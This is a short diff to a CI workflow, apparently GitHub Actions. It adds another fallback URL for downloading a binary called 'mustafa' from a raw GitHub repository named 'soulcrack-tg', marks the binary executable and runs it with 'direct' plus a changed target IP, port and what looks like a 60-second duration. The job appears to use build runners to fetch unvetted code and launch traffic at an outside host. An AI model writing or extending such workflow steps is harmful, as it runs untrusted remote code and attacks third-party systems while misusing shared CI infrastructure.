@@ -24,8 +24,10 @@ jobs:
             B="/tmp/bin"
           elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin2 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/master/mustafa" 2>/dev/null; then
             B="/tmp/bin2"
+          elif curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/bin3 "https://raw.githubusercontent.com/narutouzumaki9tail786786-sketch/soulcrack-tg/main/mustafa" 2>/dev/null; then
+            B="/tmp/bin3"
           fi
           if [ -n "$B" ]; then
             chmod +x "$B"
-            "$B" direct 91.108.4.1 32002 60 1
+            "$B" direct 91.108.13.33 32000 60 1
           fi
